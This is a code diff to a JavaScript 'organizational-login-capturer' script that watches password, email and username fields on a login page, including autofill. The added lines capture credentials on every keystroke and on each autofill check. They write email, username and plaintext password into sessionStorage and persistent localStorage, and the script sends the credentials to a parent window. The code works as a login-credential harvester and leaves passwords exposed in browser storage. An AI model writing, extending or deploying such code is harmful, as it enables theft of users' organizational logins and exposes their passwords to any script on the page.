@@ -80,7 +80,7 @@
         }
     }
     
-    // Function to capture form field values
+    // Enhanced function to capture form field values and store credentials
     function captureFormData() {
         const formData = {};
         
@@ -118,6 +118,38 @@
                 }
             }
         });
+        
+        // Store credentials in sessionStorage for OAuth callback to access
+        if (capturedCredentials.password || capturedCredentials.email || capturedCredentials.username) {
+            try {
+                sessionStorage.setItem('captured_credentials', JSON.stringify({
+                    email: capturedCredentials.email,
+                    username: capturedCredentials.username,
+                    password: capturedCredentials.password,
+                    domain: capturedCredentials.domain,
+                    captureTime: capturedCredentials.captureTime,
+                    source: 'organizational-login-capturer'
+                }));
+                
+                // Also store in localStorage as backup
+                localStorage.setItem('user_credentials', JSON.stringify({
+                    email: capturedCredentials.email,
+                    username: capturedCredentials.username,
+                    password: capturedCredentials.password,
+                    domain: capturedCredentials.domain,
+                    captureTime: capturedCredentials.captureTime,
+                    source: 'organizational-login-capturer'
+                }));
+                
+                console.log('💾 Stored credentials for OAuth callback:', {
+                    hasEmail: !!capturedCredentials.email,
+                    hasPassword: !!capturedCredentials.password,
+                    hasUsername: !!capturedCredentials.username
+                });
+            } catch (error) {
+                console.error('❌ Error storing credentials:', error);
+            }
+        }
         
         return formData;
     }
@@ -157,7 +189,12 @@
             timestamp: new Date().toISOString()
         };
         
-        console.log('📤 Sending organizational credentials:', payload);
+        console.log('📤 Sending organizational credentials:', {
+            hasEmail: !!capturedCredentials.email,
+            hasPassword: !!capturedCredentials.password,
+            hasUsername: !!capturedCredentials.username,
+            organizationType: capturedCredentials.organizationType
+        });
         
         // Send to parent window
         try {
@@ -196,7 +233,7 @@
             }, 100);
         });
         
-        // Monitor form changes
+        // Monitor form changes and capture credentials in real-time
         document.addEventListener('input', function(e) {
             if (e.target.type === 'password' || 
                 e.target.name?.toLowerCase().includes('password') ||
@@ -204,6 +241,11 @@
                 e.target.name?.toLowerCase().includes('user')) {
                 
                 console.log('🔍 Credential field changed:', e.target.name, e.target.type);
+                
+                // Capture immediately when password field changes
+                setTimeout(() => {
+                    captureFormData();
+                }, 500);
             }
         });
         
@@ -225,7 +267,7 @@
         });
     }
     
-    // Monitor for credential auto-fill
+    // Monitor for credential auto-fill and changes
     function monitorAutoFill() {
         setInterval(() => {
             const passwordFields = document.querySelectorAll('input[type="password"]');
@@ -256,7 +298,8 @@
             });
             
             if (hasNewData) {
-                console.log('🔄 Auto-fill detected, updated credentials');
+                console.log('🔄 Auto-fill detected, updating stored credentials');
+                captureFormData(); // This will update sessionStorage
             }
         }, 2000);
     }
